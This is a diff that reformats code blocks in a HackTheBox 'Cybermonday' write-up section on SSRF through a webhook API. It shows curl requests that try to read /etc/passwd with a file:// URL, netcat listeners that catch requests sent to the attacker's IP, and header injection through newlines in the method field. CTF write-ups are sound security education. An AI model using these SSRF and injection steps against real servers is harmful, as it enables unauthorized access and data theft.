@@ -9,17 +9,16 @@
 [Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)
 
 Now that we have the ability to [[ssrf|make the web server send requests for us]], the question is what to do with it. The first thing to try would be to [[local-file-inclusion|get files on the system]]:
-```bash
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "file://etc/passwd", "method": "GET"}' -v
+```shell
+$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "file://etc/passwd", "method": "GET"}' -v
 
 {"status":"error","message":"Only http protocol is allowed"}
 ```
 
 Not going to be that easy unfortunately. With us only being able to make [[http|HTTP]] requests, the use right now seems limited. Let's use a [[netcat|`netcat`]] listener and send some requests to see what info the webhook is sending.
-```bash
-nc -lvnp 8080
-
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "GET"}' -v
+```shell
+$ nc -lvnp 8080
+$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "GET"}' -v
 
 GET / HTTP/1.1
 Host: <your ip>:8080
@@ -27,10 +26,9 @@ Accept: */*
 ```
 
 Hmm, not much to go on here. What about a `POST`?
-```bash
-nc -lvnp 8080
-
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "POST"}' -v
+```shell
+$ nc -lvnp 8080
+$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "POST"}' -v
 
 POST / HTTP/1.1
 Host: <your ip>:8080
@@ -38,10 +36,9 @@ Accept: */*
 ```
 
 Still very little. Well we've already tried messing around with the `url` with no luck but what about the `method`?
-```bash
-nc -lvnp 8080
-
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "HMM"}' -v
+```shell
+$ nc -lvnp 8080
+$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "HMM"}' -v
 
 HMM / HTTP/1.1
 Host: <your ip>:8080
@@ -49,10 +46,9 @@ Accept: */*
 ```
 
 I don't think `HMM` is a valid HTTP verb (though there are a lot more than you might think). So we can assume the `method` is not being validated, but how far does this go?
-```bash
-nc -lvnp 8080
-
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "TEST\ntest 2"}' -v
+```shell
+$ nc -lvnp 8080
+$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "TEST\ntest 2"}' -v
 
 TEST
 test 2 / HTTP/1.1
